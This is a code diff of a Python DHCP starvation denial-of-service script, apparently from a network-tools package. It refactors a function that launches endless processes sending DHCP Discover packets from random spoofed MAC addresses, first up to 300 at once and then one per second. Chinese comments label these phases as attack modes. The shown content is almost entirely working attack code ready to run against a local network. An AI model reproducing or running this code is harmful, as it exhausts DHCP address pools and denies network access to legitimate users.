@@ -13,26 +13,23 @@ import random
 import multiprocessing
 import time
 from PyQYT.Network.Tools.Random_MAC import Random_MAC
-
-def DHCP_Discover_MAC(ifname, MAC):	
-	discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=MAC, type=0x0800) / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(dport=67,sport=68) / BOOTP(op=1, chaddr=MAC) / DHCP(options=[('message-type','discover'), ('param_req_list', b'\x01\x06\x0f,\x03!\x96+'), ('end')])
-	sendp(discover, iface = ifname)
+from PyQYT.Network.DHCP.DHCP_Discover import DHCP_Discover_Sendonly
 
 def DHCP_Discover_DoS(ifname):
 	i = 1
 	while True:
-		if i < 300:
-			MAC_ADD = Random_MAC()
-			print(MAC_ADD)
-			multi_dos = multiprocessing.Process(target=DHCP_Discover_MAC, args=(ifname, MAC_ADD))
+		if i < 300:#300以内最大并发攻击！
+			MAC_ADD = Random_MAC()#随机产生MAC地址！
+			print(MAC_ADD)#打印随机产生的MAC地址！
+			multi_dos = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
 			multi_dos.start()
 			i += 1
-		else:
-			MAC_ADD = Random_MAC()
-			print(MAC_ADD)
-			multi_dos = multiprocessing.Process(target=DHCP_Discover_MAC, args=(ifname, MAC_ADD))
+		else:#300以上转为低速攻击！
+			MAC_ADD = Random_MAC()#随机产生MAC地址！
+			print(MAC_ADD)#打印随机产生的MAC地址！
+			multi_dos = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
 			multi_dos.start()
-			time.sleep(1)
+			time.sleep(1)#每一秒发起一次攻击！
 			i += 1
 
 if __name__ == '__main__':
